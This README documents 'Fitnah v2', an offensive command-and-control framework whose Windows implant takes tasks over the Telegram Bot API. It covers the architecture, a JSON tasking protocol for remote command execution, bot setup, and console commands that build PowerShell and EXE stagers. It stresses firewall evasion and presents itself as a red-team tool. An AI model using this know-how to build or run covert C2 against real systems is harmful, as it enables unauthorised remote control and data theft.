# Fitnah v2 — Telegram C2 Framework

> **For authorised penetration testing, red team engagements, and CTF lab use only.**

Fitnah v2 is a full-featured command-and-control framework that uses the Telegram Bot API as its primary C2 channel. An implant running on a target machine communicates exclusively with `api.telegram.org` over HTTPS — traffic that looks identical to any other Telegram usage and passes through almost every corporate firewall.

---

## Architecture

```
OPERATOR SIDE
  python main.py
  ┌──────────────────┐   ┌──────────────────────────────────────────┐
  │  FitnahConsole   │◄──│  Kernel (plugin loader, session mgr,     │
  │  (REPL)          │   │   loot DB, scheduler, audit log)         │
  └──────────────────┘   └───────────────┬──────────────────────────┘
                                         │
                          ┌──────────────▼─────────────────┐
                          │   C2 Router                     │
                          │   [Telegram]  priority 0        │
                          │   [Discord ]  priority 1        │
                          │   [HTTP    ]  priority 2        │
                          └──────────────┬─────────────────┘
                                         │ HTTPS (api.telegram.org)
                    ┌────────────────────▼────────────────────┐
                    │             Telegram Cloud               │
                    └────────────────────┬────────────────────┘
                                         │ HTTPS (api.telegram.org)
TARGET SIDE
  fitnah_x64.exe   (C99 implant, mingw-w64 compiled)
  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────────┐
  │ Beacon Loop │  │ AES-256-GCM  │  │ Command Handlers        │
  │ (WinINet)   │  │ Crypto       │  │ exec/ps/screenshot/...  │
  └─────────────┘  └──────────────┘  └─────────────────────────┘
```

**Wire protocol** (JSON over Telegram messages):
```
Operator → Agent : {"type":"TASK","id":"<hex8>","command":"exec","args":{"cmd":"whoami"}}
Agent → Operator : {"type":"ACK","id":"<hex8>","status":"ok","output":"nt authority\\system"}
Agent → Operator : {"type":"CHECKIN","agent_id":"...","hostname":"...","os":"...","ip":"..."}
```

---

## Quick Start (5 minutes)

### Prerequisites
```bash
pip install -r requirements.txt
```

### 1. Create a Telegram bot
1. Message `@BotFather` on Telegram
2. Send `/newbot` — follow prompts — copy your **BOT_TOKEN**
3. Create a **private group**, add your bot as admin
4. Get the group chat ID: `https://api.telegram.org/bot<TOKEN>/getUpdates`
   Look for `"chat":{"id":-100XXXXXXXXXX}`

### 2. Configure
Edit `config/framework.yaml`:
```yaml
operator:
  tag: operator1
  allowed_telegram_ids: [YOUR_PERSONAL_TELEGRAM_ID]
telegram:
  token: "123456:ABC-DEF..."
  operator_chat_id: -100123456789
c2:
  sleep: 5
  jitter: 20
  task_timeout: 30
```

### 3. Run
```bash
python main.py
python main.py --project op_target1 --operator alice
```

### 4. Build a stager
After an agent checks in:
```
op_target1 > builder -f ps1 -a <agent_id>
op_target1 > builder -f exe -a <agent_id> --arch x64
```

---

## Documentation Index

| Document | Contents |
|---|---|
| [GUIDE_OPERATOR.md](GUIDE_OPERATOR.md) | Every console command with examples |
| [GUIDE_PLUGINS.md](GUIDE_PLUGINS.md) | All 74 plugins by category with params |
| [GUIDE_IMPLANT.md](GUIDE_IMPLANT.md) | C implant internals, crypto, compiling |
| [GUIDE_BUILDER.md](GUIDE_BUILDER.md) | Payload formats, encryption, stager generation |
| [GUIDE_DEVELOPMENT.md](GUIDE_DEVELOPMENT.md) | Adding plugins, SDK reference, writing tests |

---

## Key Design Decisions

| Decision | Reason |
|---|---|
| Telegram as C2 bus | HTTPS to `api.telegram.org` — passes most firewalls, no custom infra needed |
| Per-agent private group | Clean separation of task/ACK traffic per implant |
| JSON wire protocol | Human-readable, easy to debug, extensible |
| Plugin auto-discovery | Drop a `.py` in `fitnah/plugins/<category>/` — kernel loads it on `reload` |
| SQLite for loot | No external DB dependency, portable file |
| asyncio + threading | Async C2 loop in background thread; blocking REPL on main thread |
